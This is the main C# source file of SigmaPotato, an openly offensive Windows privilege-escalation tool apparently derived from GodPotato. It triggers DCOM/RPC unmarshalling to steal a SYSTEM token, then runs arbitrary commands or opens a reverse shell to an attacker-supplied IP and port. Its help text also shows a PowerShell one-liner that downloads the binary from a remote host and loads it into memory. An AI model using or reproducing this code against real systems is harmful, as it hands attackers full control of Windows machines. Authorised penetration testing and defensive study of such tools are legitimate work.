using System;
using System.IO;
using SigmaPotato.NativeAPI;
using System.Security.Principal;
using System.Reflection;
using SharpToken;
using System.Diagnostics;

namespace SigmaPotato
{
    public class Program
    {
       
        public static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;
            
            // Detect AssemblyName and adjust help message accordingly
            Assembly assembly = Assembly.GetExecutingAssembly();
            AssemblyName assemblyName = assembly.GetName();
            string assemblyString = assemblyName.Name;
            string helpMessage = null;

            string banner = @"
 ____  _                       ____       _        _                   
/ ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___  
\___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \ 
 ___) | | (_| | | | | | | (_| |  __/ (_) | || (_| | || (_) |
|____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/ 
         |___/";

            string bannerCore = @"
 ____  _                       ____       _        _         |   ____               
/ ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___   |  / ___|___  _ __ ___ 
\___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \  | | |   / _ \| '__/ _ \
 ___) | | (_| | | | | | | (_| |  __/ (_) | || (_| | || (_) | | | |__| (_) | | |  __/
|____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/  |  \____\___/|_|  \___|
         |___/                                               |";

            string helpBody = @"
Author: Tyler McCann (@tylerdotrar)
Arbitary Version Number: v1.0.0

------------------------------
Usage from Disk via the Binary
------------------------------
---                    
[+]  Command Execution :  ./SigmaPotato.exe <command>
[+]  Reverse Shell     :  ./SigmaPotato.exe --revshell <ip_addr> <port>
---                    

-------------------------------------
Usage from Memory via .NET Reflection
-------------------------------------
---                    
[+]  Load Locally      :  [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
[+]  Load Remotely     :  [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(""http(s)://<ip_addr>/SigmaPotato.exe""))
---                    
[+]  Command Execution :  [SigmaPotato.Program]::Main(""<command>"")
[+]  Reverse Shell     :  [SigmaPotato.Program]::Main(@(""--revshell"",""<ip_addr>"",""<port>""))
---
";

            // Detect AssemblyName and adjust help message accordingly.
            if (assemblyString == "SigmaPotatoCore")
            {
                helpMessage = bannerCore + Environment.NewLine + helpBody;
                helpMessage = helpMessage.Replace("SigmaPotato", "SigmaPotatoCore");
            }
            else
            {
                helpMessage = banner + Environment.NewLine + helpBody;
            }


            // General Error Correction
            if (args.Length == 0 || string.IsNullOrEmpty(args[0]))
            {
                ConsoleWriter.WriteLine("[-] No arguments detected.  Use '--help' for usage information.\n");
                return;
            }
            else if (args[0] != "--revshell" && args.Length > 1)
            {
                ConsoleWriter.WriteLine("[-] Unexpected arguments detected.  Use '--help' for usage information.");
                ConsoleWriter.WriteLine("    o (Hint: You might need to wrap your arguments in quotations.)\n");
                return;
            }


            // Return help message
            else if (args[0] == "--help")
            {
                ConsoleWriter.WriteLine(helpMessage);
                return;
            }


            // Establish input variables.
            string commandLine = args[0];
            string IpAddress = null;
            int Port = 0;

            if (commandLine == "--revshell")
            {
                if (args.Length < 3)
                {
                    ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
                    ConsoleWriter.WriteLine("    o (Hint: You need to specify an IP address and port.)\n");
                    return;
                }

                IpAddress = args[1];
                Port = int.Parse(args[2]);
            }

            
            // Start Esoteric Tomfoolery
            try
            {
                GodPotatoNetContext GodPotatoNetContext = new GodPotatoNetContext(ConsoleWriter, Guid.NewGuid().ToString());
                GodPotatoNetContext.HookRPC();

                ConsoleWriter.WriteLine("[+] Starting Pipe Server...");
                GodPotatoNetContext.Start();

                GodPotatoNetUnmarshalTrigger unmarshalTrigger = new GodPotatoNetUnmarshalTrigger(GodPotatoNetContext);

                try
                {
                    int hr = unmarshalTrigger.Trigger();
                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }
                
                // Attempt to execute command in an elevated security context
                WindowsIdentity systemIdentity = GodPotatoNetContext.GetToken();
                if (systemIdentity != null)
                { 
					TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, commandLine, IpAddress, Port);
                }
                else
                {
                    ConsoleWriter.WriteLine("[-] Failed to impersonate security context token.");
                }

                GodPotatoNetContext.Restore();
                GodPotatoNetContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine($"[-] Error! Exception: {e.Message}");
            }
        }
    }
}
